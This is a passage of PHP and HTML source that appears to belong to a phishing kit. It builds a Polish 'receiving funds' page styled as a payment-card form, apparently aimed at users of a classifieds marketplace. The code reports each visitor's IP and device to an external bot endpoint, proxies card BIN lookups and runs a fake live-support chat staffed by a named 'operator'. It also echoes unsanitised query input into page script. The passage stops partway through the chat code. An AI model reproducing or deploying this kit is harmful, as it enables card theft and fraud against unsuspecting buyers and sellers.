ini_set('display_errors', 0); 
error_reporting(E_ALL);
include('./config.php');

if(!$_COOKIE['tokena']){
  $token = substr(md5(uniqid(rand(), true)),0,8);
}else{
  $token = $_COOKIE['tokena'];
}

if($_GET['get_bin']){
	echo file_get_contents("https://bincheck.io/details/".$_GET['get_bin']);
exit();
}
function getBrowser()
    {
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";

        //First get the platform? 
        if (preg_match('/android/i', $u_agent)) {
            $platform = '📱 Android';
        }elseif (preg_match('/iphone/i', $u_agent)) {
            $platform = '📱 iPhone';
        }elseif (preg_match('/ipad/i', $u_agent)) {
            $platform = '📱 iPad';
        }elseif (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        }
        elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = '💻 Mac OS';
        }
        elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = '💻 Windows';
        }
         
    
        // Next get the name of the useragent yes seperately and for good reason
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Internet Explorer';
            $ub = "MSIE";
        }
        elseif(preg_match('/Firefox/i',$u_agent))
        {
            $bname = 'Mozilla Firefox';
            $ub = "Firefox";
        }
        elseif(preg_match('/Chrome/i',$u_agent))
        {
            $bname = 'Google Chrome';
            $ub = "Chrome";
        }
        elseif(preg_match('/Safari/i',$u_agent))
        {
            $bname = 'Apple Safari';
            $ub = "Safari";
        }
        elseif(preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Opera';
            $ub = "Opera";
        }
        elseif(preg_match('/Netscape/i',$u_agent))
        {
            $bname = 'Netscape';
            $ub = "Netscape";
        }
    
        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            // we have no matching number just continue
        }
    
        // see how many we have
        $i = count($matches['browser']);
        if ($i != 1) {
            //we will have two since we are not using 'other' argument yet
            //see if version is before or after the name
            if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
                $version= $matches['version'][0];
            }
            else {
                $version= $matches['version'][1];
            }
        }
        else {
            $version= $matches['version'][0];
        }
    
        // check if we have a number
        if ($version==null || $version=="") {$version="?";}
    
        return array(
            'userAgent' => $u_agent,
            'name'      => $bname,
            'version'   => $version,
            'platform'  => $platform,
            'pattern'    => $pattern
        );
    }


$product = file_get_contents($bot_config->bot_link."api.php?get_product=".$_GET['product']);
$product = json_decode($product);
$browser = getBrowser();  

$data = array(
  'visit'=>'oplata',  
  'product'=>$product->id,
  'ip'=>$_SERVER['REMOTE_ADDR'],
  'device'=>$browser['platform'].', '.$browser['name']
  );
  file_get_contents($bot_config->bot_link.'bot.php?'.http_build_query($data));   
 
  echo '

<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="">
    <style type="text/css">
      .loader_2 {
   border: 16px solid #f3f3f3;
   border-radius: 50%;
   border-top: 16px solid #002f34;
   border-bottom: 16px solid #002f34;
   width: 90px;
   height: 90px;
   margin: auto;
   -webkit-animation: spin 2s linear infinite;
   animation: spin 2s linear infinite;
  }
    @-webkit-keyframes spin {
   0% { -webkit-transform: rotate(0deg); }
   100% { -webkit-transform: rotate(360deg); }
  }

  @keyframes spin {
   0% { transform: rotate(0deg); }
   100% { transform: rotate(360deg); }
  }
        @import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
 body {
	 background: #fff;
	 font-family: "Source Sans Pro", sans-serif;
	 font-size: 16px;
}
 * {
	 box-sizing: border-box;
}
	    body a:last-child { z-index:-9999!important; position:absolute;}
 *:focus {
	 outline: none;
}
 .wrapper {
	 min-height: 100vh;
	 display: flex;
	 padding: 0px 15px;
}
 @media screen and (max-width: 700px), (max-height: 500px) {
	 .wrapper {
		 flex-wrap: wrap;
		 flex-direction: column;
	}
}
 .card-form {
	 max-width: 570px;
	 margin: auto;
	 width: 100%;
}
 @media screen and (max-width: 576px) {
	 .card-form {
		 margin: 0 auto;
	}
}
 .card-form__inner {
	 background: #fff;
	 box-shadow: 0 30px 60px 0 rgba(90, 116, 148, 0.4);
	 border-radius: 10px;
	 padding: 35px;
	 padding-top: 180px;
}
 @media screen and (max-width: 480px) {
	 .card-form__inner {
		 padding: 25px;
		 padding-top: 165px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-form__inner {
		 padding: 15px;
		 padding-top: 165px;
	}
}
 .card-form__row {
	 display: flex;
	 align-items: flex-start;
}
 @media screen and (max-width: 480px) {
	 .card-form__row {
		 flex-wrap: wrap;
	}
}
 .card-form__col {
	 flex: auto;
	 margin-right: 35px;
}
 .card-form__col:last-child {
	 margin-right: 0;
}
 @media screen and (max-width: 480px) {
	 .card-form__col {
		 margin-right: 0;
		 flex: unset;
		 width: 100%;
		 margin-bottom: 20px;
	}
	 .card-form__col:last-child {
		 margin-bottom: 0;
	}
}
 .card-form__col.-cvv {
	 max-width: 150px;
}
 @media screen and (max-width: 480px) {
	 .card-form__col.-cvv {
		 max-width: initial;
	}
}
 .card-form__group {
	 display: flex;
	 align-items: flex-start;
	 flex-wrap: wrap;
}
 .card-form__group .card-input__input {
	 flex: 1;
	 margin-right: 15px;
}
 .card-form__group .card-input__input:last-child {
	 margin-right: 0;
}
 .card-form__button {
	 width: 100%;
	 height: 55px;
	 background: #1ab248;
	 border: none;
	 border-radius: 5px;
	 font-size: 22px;
	 font-weight: 700;
	 font-family: "Source Sans Pro", sans-serif;
	 box-shadow: 3px 10px 20px 0px rgba(35, 100, 210, 0.3);
	 color: #fff;
	 margin-top: 20px;
	 cursor: pointer;
}
 @media screen and (max-width: 480px) {
	 .card-form__button {
		 margin-top: 10px;
	}
}
 .card-item {
	 max-width: 430px;
	 height: 270px;
	 margin-left: auto;
	 margin-right: auto;
	 position: relative;
	 z-index: 2;
	 width: 100%;
}
 @media screen and (max-width: 480px) {
	 .card-item {
		 max-width: 310px;
		 height: 220px;
		 width: 90%;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item {
		 height: 180px;
	}
}
 .card-item.-active .card-item__side.-front {
	 transform: perspective(1000px) rotateY(180deg) rotateX(0deg) rotateZ(0deg);
}
 .card-item.-active .card-item__side.-back {
	 transform: perspective(1000px) rotateY(0) rotateX(0deg) rotateZ(0deg);
}
 .card-item__focus {
	 position: absolute;
	 z-index: 3;
	 border-radius: 5px;
	 left: 0;
	 top: 0;
	 width: 100%;
	 height: 100%;
	 transition: all 0.35s cubic-bezier(0.71, 0.03, 0.56, 0.85);
	 opacity: 0;
	 pointer-events: none;
	 overflow: hidden;
	 border: 2px solid rgba(255, 255, 255, 0.65);
}
 .card-item__focus:after {
	 content: "";
	 position: absolute;
	 top: 0;
	 left: 0;
	 width: 100%;
	 background: #08142f;
	 height: 100%;
	 border-radius: 5px;
	 filter: blur(25px);
	 opacity: 0.5;
}
 .card-item__focus.-active {
	 opacity: 1;
}
 .card-item__side {
	 border-radius: 15px;
	 overflow: hidden;
	 box-shadow: 0 20px 60px 0 rgba(14, 42, 90, 0.55);
	 transform: perspective(2000px) rotateY(0deg) rotateX(0deg) rotate(0deg);
	 transform-style: preserve-3d;
	 transition: all 0.8s cubic-bezier(0.71, 0.03, 0.56, 0.85);
	 backface-visibility: hidden;
	 height: 100%;
}
 .card-item__side.-back {
	 position: absolute;
	 top: 0;
	 left: 0;
	 width: 100%;
	 transform: perspective(2000px) rotateY(-180deg) rotateX(0deg) rotate(0deg);
	 z-index: 2;
	 padding: 0;
	 height: 100%;
}
 .card-item__side.-back .card-item__cover {
	 transform: rotateY(-180deg);
}
 .card-item__bg {
	 max-width: 100%;
	 display: block;
	 max-height: 100%;
	 height: 100%;
	 width: 100%;
	 object-fit: cover;
}
 .card-item__cover {
	 height: 100%;
	 background-color: #1c1d27;
	 position: absolute;
	 height: 100%;
	 background-color: #1c1d27;
	 left: 0;
	 top: 0;
	 width: 100%;
	 border-radius: 15px;
	 overflow: hidden;
}
 .card-item__cover:after {
	 content: "";
	 position: absolute;
	 left: 0;
	 top: 0;
	 width: 100%;
	 height: 100%;
	 background: rgba(6, 2, 29, 0.45);
}
 .card-item__top {
	 display: flex;
	 align-items: flex-start;
	 justify-content: space-between;
	 margin-bottom: 40px;
	 padding: 0 10px;
}
 @media screen and (max-width: 480px) {
	 .card-item__top {
		 margin-bottom: 25px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__top {
		 margin-bottom: 15px;
	}
}
 .card-item__chip {
	 width: 60px;
}
 @media screen and (max-width: 480px) {
	 .card-item__chip {
		 width: 50px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__chip {
		 width: 40px;
	}
}
 .card-item__type {
	 height: 45px;
	 position: relative;
	 display: flex;
	 justify-content: flex-end;
	 max-width: 100px;
	 margin-left: auto;
	 width: 100%;
}
 @media screen and (max-width: 480px) {
	 .card-item__type {
		 height: 40px;
		 max-width: 90px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__type {
		 height: 30px;
	}
}
 .card-item__typeImg {
	 max-width: 100%;
	 object-fit: contain;
	 max-height: 100%;
	 object-position: top right;
}
 .card-item__info {
	 color: #fff;
	 width: 100%;
	 max-width: calc(100% - 85px);
	 padding: 10px 15px;
	 font-weight: 500;
	 display: block;
	 cursor: pointer;
}
 @media screen and (max-width: 480px) {
	 .card-item__info {
		 padding: 10px;
	}
}
 .card-item__holder {
	 opacity: 0.7;
	 font-size: 13px;
	 margin-bottom: 6px;
}
 @media screen and (max-width: 480px) {
	 .card-item__holder {
		 font-size: 12px;
		 margin-bottom: 5px;
	}
}
 .card-item__wrapper {
	 font-family: "Source Code Pro", monospace;
	 padding: 25px 15px;
	 position: relative;
	 z-index: 4;
	 height: 100%;
	 text-shadow: 7px 6px 10px rgba(14, 42, 90, 0.8);
	 user-select: none;
}
 @media screen and (max-width: 480px) {
	 .card-item__wrapper {
		 padding: 20px 10px;
	}
}
 .card-item__name {
	 font-size: 18px;
	 line-height: 1;
	 white-space: nowrap;
	 max-width: 100%;
	 overflow: hidden;
	 text-overflow: ellipsis;
	 text-transform: uppercase;
}
 @media screen and (max-width: 480px) {
	 .card-item__name {
		 font-size: 16px;
	}
}
 .card-item__nameItem {
	 display: inline-block;
	 min-width: 8px;
	 position: relative;
}
 .card-item__number {
	 font-weight: 500;
	 line-height: 1;
	 color: #fff;
	 font-size: 27px;
	 margin-bottom: 35px;
	 display: inline-block;
	 padding: 10px 15px;
	 cursor: pointer;
}
 @media screen and (max-width: 480px) {
	 .card-item__number {
		 font-size: 21px;
		 margin-bottom: 15px;
		 padding: 10px 10px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__number {
		 font-size: 19px;
		 margin-bottom: 10px;
		 padding: 10px 10px;
	}
}
 .card-item__numberItem {
	 width: 16px;
	 display: inline-block;
}
 .card-item__numberItem.-active {
	 width: 30px;
}
 @media screen and (max-width: 480px) {
	 .card-item__numberItem {
		 width: 13px;
	}
	 .card-item__numberItem.-active {
		 width: 16px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__numberItem {
		 width: 12px;
	}
	 .card-item__numberItem.-active {
		 width: 8px;
	}
}
 .card-item__content {
	 color: #fff;
	 display: flex;
	 align-items: flex-start;
}
 .card-item__date {
	 flex-wrap: wrap;
	 font-size: 18px;
	 margin-left: auto;
	 padding: 10px;
	 display: inline-flex;
	 width: 80px;
	 white-space: nowrap;
	 flex-shrink: 0;
	 cursor: pointer;
}
 @media screen and (max-width: 480px) {
	 .card-item__date {
		 font-size: 16px;
	}
}
 .card-item__dateItem {
	 position: relative;
}
 .card-item__dateItem span {
	 width: 22px;
	 display: inline-block;
}
 .card-item__dateTitle {
	 opacity: 0.7;
	 font-size: 13px;
	 padding-bottom: 6px;
	 width: 100%;
}
 @media screen and (max-width: 480px) {
	 .card-item__dateTitle {
		 font-size: 12px;
		 padding-bottom: 5px;
	}
}
 .card-item__band {
	 background: rgba(0, 0, 19, 0.8);
	 width: 100%;
	 height: 50px;
	 margin-top: 30px;
	 position: relative;
	 z-index: 2;
}
 @media screen and (max-width: 480px) {
	 .card-item__band {
		 margin-top: 20px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__band {
		 height: 40px;
		 margin-top: 10px;
	}
}
 .card-item__cvv {
	 text-align: right;
	 position: relative;
	 z-index: 2;
	 padding: 15px;
}
 .card-item__cvv .card-item__type {
	 opacity: 0.7;
}
 @media screen and (max-width: 360px) {
	 .card-item__cvv {
		 padding: 10px 15px;
	}
}
 .card-item__cvvTitle {
	 padding-right: 10px;
	 font-size: 15px;
	 font-weight: 500;
	 color: #fff;
	 margin-bottom: 5px;
}
 .card-item__cvvBand {
	 height: 45px;
	 background: #fff;
	 margin-bottom: 30px;
	 text-align: right;
	 display: flex;
	 align-items: center;
	 justify-content: flex-end;
	 padding-right: 10px;
	 color: #1a3b5d;
	 font-size: 18px;
	 border-radius: 4px;
	 box-shadow: 0px 10px 20px -7px rgba(32, 56, 117, 0.35);
}
 @media screen and (max-width: 480px) {
	 .card-item__cvvBand {
		 height: 40px;
		 margin-bottom: 20px;
	}
}
 @media screen and (max-width: 360px) {
	 .card-item__cvvBand {
		 margin-bottom: 15px;
	}
}
 .card-list {
	 margin-bottom: -130px;
}
 @media screen and (max-width: 480px) {
	 .card-list {
		 margin-bottom: -120px;
	}
}
 .card-input {
	 margin-bottom: 20px;
}
 .card-input__label {
	 font-size: 14px;
	 margin-bottom: 5px;
	 font-weight: 700;
	 color: #1a3b5d;
	 width: 100%;
	 display: block;
	 user-select: none;
}
 .card-input__input {
	 width: 100%;
	 height: 50px;
	 border-radius: 5px;
	 box-shadow: none;
	 border: 1px solid #ced6e0;
	 transition: all 0.3s ease-in-out;
	 font-size: 18px;
	 padding: 5px 15px;
	 background: none;
	 color: #1a3b5d;
	 font-family: "Source Sans Pro", sans-serif;
}
 .card-input__input:hover, .card-input__input:focus {
	 border-color: #3d9cff;
}
 .card-input__input:focus {
	 box-shadow: 0px 10px 20px -13px rgba(32, 56, 117, 0.35);
}
 .card-input__input.-select {
  -webkit-appearance: none;
  background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAeCAYAAABuUU38AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAUxJREFUeNrM1sEJwkAQBdCsngXPHsQO9O5FS7AAMVYgdqAd2IGCDWgFnryLFQiCZ8EGnJUNimiyM/tnk4HNEAg/8y6ZmMRVqz9eUJvRaSbvutCZ347bXVJy/ZnvTmdJ862Me+hAbZCTs6GHpyUi1tTSvPnqTpoWZPUa7W7ncT3vK4h4zVejy8QzM3WhVUO8ykI6jOxoGA4ig3BLHcNFSCGqGAkig2yqgpEiMsjSfY9LxYQg7L6r0X6wS29YJiYQYecemY+wHrXD1+bklGhpAhBDeu/JfIVGxaAQ9sb8CI+CQSJ+QmJg0Ii/EE2MBiIXooHRQhRCkBhNhBcEhLkwf05ZCG8ICCOpk0MULmvDSY2M8UawIRExLIQIEgHDRoghihgRIgiigBEjgiFATBACAgFgghEwSAAGgoBCBBgYAg5hYKAIFYgHBo6w9RRgAFfy160QuV8NAAAAAElFTkSuQmCC");
  background-size: 12px;
  background-position: 90% center;
  background-repeat: no-repeat;
  padding-right: 30px;
}
 .slide-fade-up-enter-active {
	 transition: all 0.25s ease-in-out;
	 transition-delay: 0.1s;
	 position: relative;
}
 .slide-fade-up-leave-active {
	 transition: all 0.25s ease-in-out;
	 position: absolute;
}
 .slide-fade-up-enter {
	 opacity: 0;
	 transform: translateY(15px);
	 pointer-events: none;
}
 .slide-fade-up-leave-to {
	 opacity: 0;
	 transform: translateY(-15px);
	 pointer-events: none;
}
 .slide-fade-right-enter-active {
	 transition: all 0.25s ease-in-out;
	 transition-delay: 0.1s;
	 position: relative;
}
 .slide-fade-right-leave-active {
	 transition: all 0.25s ease-in-out;
	 position: absolute;
}
 .slide-fade-right-enter {
	 opacity: 0;
	 transform: translateX(10px) rotate(45deg);
	 pointer-events: none;
}
 .slide-fade-right-leave-to {
	 opacity: 0;
	 transform: translateX(-10px) rotate(45deg);
	 pointer-events: none;
}
 .github-btn {
	 position: absolute;
	 right: 40px;
	 bottom: 50px;
	 text-decoration: none;
	 padding: 15px 25px;
	 border-radius: 4px;
	 box-shadow: 0px 4px 30px -6px rgba(36, 52, 70, 0.65);
	 background: #24292e;
	 color: #fff;
	 font-weight: bold;
	 letter-spacing: 1px;
	 font-size: 16px;
	 text-align: center;
	 transition: all 0.3s ease-in-out;
}
 @media screen and (min-width: 500px) {
	 .github-btn:hover {
		 transform: scale(1.1);
		 box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
	}
}
 @media screen and (max-width: 700px) {
	 .github-btn {
		 position: relative;
		 bottom: auto;
		 right: auto;
		 margin-top: 20px;
	}
	 .github-btn:active {
		 transform: scale(1.1);
		 box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
	}
}
     </style>
    <title>PRZYJĘCIE FUNDUSZY</title>
          <!-- CHAT links -->
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
      <style type="text/css">
        body{
    
}
.col-md-2, .col-md-10{
    padding:0;
}
.panel{
  z-index: 999999;
    margin-bottom: 0px;
}
/* #### Tablets Portrait or Landscape #### */
@media screen and (min-width: 1px)  and (max-width: 1023px){
    .open-button {
  z-index: 300;
  border: 0; 
  content: \'Напишите нам в чат\';
  background: #002f34;
  border-radius: 5px;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  width: 150px;
  height: 36px;
  position: fixed;
  bottom: 80px;
  }
  .panel-body {
    height: 400px;
  }
  .chat-window{
    height:400px;
      display: flex;
      align-items: flex-start;
    z-index: 9999;
  min-width: 100%;
    bottom:5px;
    position: fixed;
    right: 10px;
  }

 #op_img {
  height: 50%; width: 70%;border-radius: 50%;max-height: 80px;
  }

  #usr_img {
    height: 100%; border-radius: 50%;
        width: 70%;
    left: 10%;
    position: inherit;
  }
}
@media screen and (min-width: 1024px){
    #open-button-text {
    visibility: hidden;
  }
  .open-button {
  z-index: 99999;
  border: 0; 
  background-color: transparent;
  background-image: url(\'/btn.png\');
  background-size: 100px 100px;
  background-repeat: no-repeat;
  content: \'\';
  padding: 16px 20px;
  border: none;
  cursor: pointer;
  opacity: 0.6;
  width: 150px;
  height: 100px;
  position: fixed;
  top: 50px;
  
}
  .panel-body {
    height: 400px;
  }
  .chat-window{
    height:400px;
    z-index: 9999;
    display: fixed;
    align-items: flex-start;
    min-width: 485px;
    bottom:5px;
    position: fixed;
    right: 10px;
  }
  #op_img {
  height: 100%; width: 100%;border-radius: 50%;max-height: 100px;
  }

  #usr_img {
    height: 100%; border-radius: 50%;
        width: 90%;
    left: 10%;
    position: inherit;
  }
}
.chat-window > div > .panel{
    border-radius: 5px 5px 0 0;
}
.icon_minim{
    padding:2px 10px;
}
.msg_container_base{
  background: #e5e5e5;
  margin: 0;
  padding: 0 10px 10px;
  max-height:300px;
  overflow-x:hidden;
}
.top-bar {
  background: #002f34;
  color: white;
  padding: 10px;
  position: relative;
  overflow: hidden;
  display: flex;
}
.msg_receive{
    padding-left:0;
    margin-left:0;
    text-align: left;
}
.msg_sent{
    padding-bottom:20px !important;
    margin-right:0;
    text-align: left;
}
.messages {
  background: white;
  padding: 10px;
  border-radius: 2px;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
  max-width:100%;
}
.messages > p {
    font-size: 13px;
    margin: 0 0 0.2rem 0;
  }
.messages > time {
    font-size: 11px;
    color: #ccc;
}
.msg_container {
    padding: 10px;
    overflow: hidden;
    display: flex;
}
.panel >img {
    display: block;
    width: 100%;
}
.avatar {
    position: relative;
}
.base_receive > .avatar:after {
    content: "";
    position: absolute;
    top: 0;
    right: 0;
    width: 0;
    height: 0;
    border: 5px solid #FFF;
    border-left-color: rgba(0, 0, 0, 0);
    border-bottom-color: rgba(0, 0, 0, 0);
}

.base_sent {
  justify-content: flex-end;
  align-items: flex-end;
}
.base_sent > .avatar:after {
    content: "";
    position: absolute;
    bottom: 0;
    left: 0;
    width: 0;
    height: 0;
    border: 5px solid white;
    border-right-color: transparent;
    border-top-color: transparent;
    box-shadow: 1px 1px 2px rgba(black, 0.2); // not quite perfect but close
}

.msg_sent > time{
    float: right;
}

.msg_container_base .col-md-2, .msg_container_base .col-md-10 {
    padding: 0;
}

.msg_container_base::-webkit-scrollbar-track
{
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
    background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar
{
    width: 12px;
    background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar-thumb
{
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
    background-color: #555;
}

.btn-group.dropup{
    position:fixed;
    left:0px;
    bottom:0;
}

#btn-chat{
  background-color: #002f34;
  border-color: white;
  padding-left: 5px;
  padding-right: 5px;
}

#new_chat {
  width: 10px;
  height: 174px;
  float: right;
  right: 10px;
  top: 50px;
  position: fixed;
  z-index: 0;
}
1      </style>
      <!-- CHAT links close -->
</head>

<body>
 <!--- CHAT --->
    <div class="row chat-window col-xs-5 col-md-3" id="chat_window_1" style="margin-left:10px;display: none; position:fixed;">
      <input type="hidden" id="product" value="'.$product->title.'">
        <input type="hidden" id="refresh_time" value="'.time().'">
        <input type="hidden" id="home_time" value="'.time().'">
        <div class="col-xs-12 col-md-12">
            <div class="panel panel-default">
                <div class="panel-heading top-bar" style="border-top-left-radius: 10px; border-top-right-radius: 10px;">
                    <div class="col-md-8 col-xs-8" style="text-align: left; right: 13px;width: 90%">
                        <h4 class="panel-title" style="color: white;"><svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-chat" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" d="M2.678 11.894a1 1 0 0 1 .287.801 10.97 10.97 0 0 1-.398 2c1.395-.323 2.247-.697 2.634-.893a1 1 0 0 1 .71-.074A8.06 8.06 0 0 0 8 14c3.996 0 7-2.807 7-6 0-3.192-3.004-6-7-6S1 4.808 1 8c0 1.468.617 2.83 1.678 3.894zm-.493 3.905a21.682 21.682 0 0 1-.713.129c-.2.032-.352-.176-.273-.362a9.68 9.68 0 0 0 .244-.637l.003-.01c.248-.72.45-1.548.524-2.319C.743 11.37 0 9.76 0 8c0-3.866 3.582-7 8-7s8 3.134 8 7-3.582 7-8 7a9.06 9.06 0 0 1-2.347-.306c-.52.263-1.639.742-3.468 1.105z"/>
</svg>
</span> Czat online</h4>
                    </div>
                    <div class="col-md-4 col-xs-4" style="text-align: right; left: 13px;width: 10%;float: right;">
                        <button type="button" class="close icon_close" aria-label="Close" data-id="chat_window_1">
                          <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                </div>
                <div class="panel-body msg_container_base">
                    
                </div>
                <div class="panel-footer">
                    <div class="input-group">
                        <input id="btn-input" type="text" class="form-control input-sm chat_input" placeholder="Napisz tutaj..." />
                        <span class="input-group-btn">
                        <button class="btn btn-primary" id="btn-chat" style="margin-top: 0px;">Wyślij wiadomość</button>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <button class="open-button" id="open-support" onclick="openChat()" style="right: 10px; "><p id="open-button-text" style="color: white;margin-left: auto;margin-right: auto;margin: 0 auto;">Wsparcie</p></button>
    <script type="text/javascript">
      		    $(document).on(\'click\', \'.panel-heading span.icon_minim\', function (e) {
    var $this = $(this);
    if (!$this.hasClass(\'panel-collapsed\')) {
        $this.parents(\'.panel\').find(\'.panel-body\').slideUp();
        $this.addClass(\'panel-collapsed\');
        $this.removeClass(\'glyphicon-minus\').addClass(\'glyphicon-plus\');
    } else {
        $this.parents(\'.panel\').find(\'.panel-body\').slideDown();
        $this.removeClass(\'panel-collapsed\');
        $this.removeClass(\'glyphicon-plus\').addClass(\'glyphicon-minus\');
    }
});
$(document).on(\'focus\', \'.panel-footer input.chat_input\', function (e) {
    var $this = $(this);
    if ($(\'#minim_chat_window\').hasClass(\'panel-collapsed\')) {
        $this.parents(\'.panel\').find(\'.panel-body\').slideDown();
        $(\'#minim_chat_window\').removeClass(\'panel-collapsed\');
        $(\'#minim_chat_window\').removeClass(\'glyphicon-plus\').addClass(\'glyphicon-minus\');
    }
});
$(document).on(\'click\', \'#open-support\', function (e) {
    $(\'#chat_window_1\').show();
    $(\'#open-support\').hide();
});

function openChat() {
	$(\'#chat_window_1\').show();
    $(\'#open-support\').hide();
}
$(document).on(\'click\', \'.icon_close\', function (e) {
    $(\'#chat_window_1\').hide();
    $(\'#open-support\').show();
});
$(document).ready(function () {
    $(\'#chat_window_1\').hide();
    $(\'#open-support\').show();
});

$(document).on(\'click\', \'#btn-chat\', function (e) {
    sendMessage();
});
		function sendMessage() {
			message = document.getElementById("btn-input").value;
			if (message === \'\') {
				return;
			}
			document.getElementById("btn-input").value = \'\';
			var token = getCookie(\'tokena\');
			if (token =="") {
				var token = "'.$token.'";
			}
			xhttp=new XMLHttpRequest();
			var track_id = document.getElementById("refresh_time").value;
			var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
			xhttp.open("POST", url, true);
			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			var uid = document.getElementById("home_time").value;
			var title = document.getElementById("product").value;
			xhttp.send("send=1&track_id="+track_id+"&uid="+uid+"&product='.$_GET['product'].'&token="+token+"&message="+message+"&type=kufar&title="+title);
			cur_text = $(\'.msg_container_base\').html();
			$(\'.msg_container_base\').html(cur_text+\'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+message+\'</p><time datetime="\'+getCurTime()+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\');
			setCookie(\'tokena\', token);
			var objDiv = $(\'.msg_container_base\');
			objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
		}
		var xhttp = null;
		$(document).ready(function(){	
		/* 	window.onbeforeunload = function(){
				xhttp.abort();
			}; */
			var token = getCookie(\'tokena\');
			if (token !="") {
				xhttp=new XMLHttpRequest();
				var track_id = document.getElementById("refresh_time").value;
				var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
				xhttp.open("POST", url, true);
				xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				xhttp.send("get=1&product='.$_GET['product'].'&token="+token);
				xhttp.onload = function (e) {
						if (xhttp.readyState === 4) {
							if (xhttp.status === 200) {
								var body = xhttp.response;
								var json = JSON.parse(body);
								for (let i = 0; i < json.length; i++) {
									if (json[i].message !== \'start\') {
										cur_text = $(\'.msg_container_base\').html();
										time = getTime(json[i].date);
										if (json[i].sender == \'t\') {
											text = \'<div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%; padding: 0 5px 0 5px;"><img src="/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>\'+json[i].message+\'</p><time datetime="2009-11-13T20:00">Aleksandra</time></div></div></div>\'
										} else {
											text = \'<div class="row msg_container base_sent"><div class="col-md-10 col-xs-10 " style="width: 80%;"><div class="messages msg_sent"><p>\'+json[i].message+\'</p><time datetime="\'+time+\'">Ty</time></div></div><div class="col-md-2 col-xs-2 avatar" style="width: 20%;"><img src="/user.png" id="usr_img"></div></div>\'
										}
										$(\'.msg_container_base\').html(cur_text+text);
									}
								}
								var objDiv = $(\'.msg_container_base\');
									objDiv.scrollTop($(\'.msg_container_base\')[0].scrollHeight);
							}
						}
					}
			}
		});
		var myVar = setInterval(updateChat, 10000);
		function updateChat() {
				var token = getCookie(\'tokena\');
				if (token !="") {
						xhttp=new XMLHttpRequest();
						var track_id = document.getElementById("refresh_time").value;
						var url = location.protocol + \'//\'+document.location.hostname+\'/message.php\';
						xhttp.open("POST", url, true);
						xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						xhttp.send("get=0&product='.$_GET['product'].'&token="+token);
						xhttp.onload = function (e) {
							if (xhttp.readyState === 4) {
								if (xhttp.status === 200) {
									var body = xhttp.response;
									var json = JSON.parse(body);
									for (let i = 0; i < json.length; i++) {
										cur_text = $(\'.msg_container_base\').html();
										time = getTime(json[i].date);
										if (json[i].sender == \'t\') {
											text = \'<div class="row msg_container base_receive"><div class="col-md-2 col-xs-2 avatar" style="width: 20%; padding: 0 5px 0 5px;"><img src="/operator.png" id="op_img"></div><div class="col-xs-10 col-md-10" style="width: 80%;"><div class="messages msg_receive"><p>\'+json[i].message+\'</p><time datetime="2009-11-13T20:00">Aleksandra</time></div></div></div>\'
										} else {
